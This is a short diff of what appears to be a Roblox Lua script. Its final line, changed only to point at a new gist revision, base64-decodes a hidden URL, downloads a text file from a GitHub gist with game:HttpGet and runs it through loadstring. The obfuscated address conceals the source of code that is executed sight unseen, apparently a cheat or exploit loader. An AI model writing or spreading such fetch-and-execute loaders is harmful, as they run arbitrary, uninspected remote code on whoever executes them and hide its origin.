@@ -14,4 +14,4 @@ function decodeink(data)
     end))
 end
 
-return loadstring(game:HttpGet(tostring(decodeink("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qcm82NjZQcm8vODEyNTNjMDg3NGM4NGUzM2I1YWU1YzcwYWMyOWVhYTkvcmF3LzEyNjljMjFhOTA0ZWIyOWE4MzBiMWFjMGViNzlkYjNlZWZlYjFiZWYvaWRrLnR4dA=="))))()
+return loadstring(game:HttpGet(tostring(decodeink("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Qcm82NjZQcm8vODEyNTNjMDg3NGM4NGUzM2I1YWU1YzcwYWMyOWVhYTkvcmF3LzdiNDUzYjRmMzU1ZmFkYzFkZThkODM1NjMwNGRjNTg5ODVkMzhhNzgvaWRrLnR4dA=="))))()
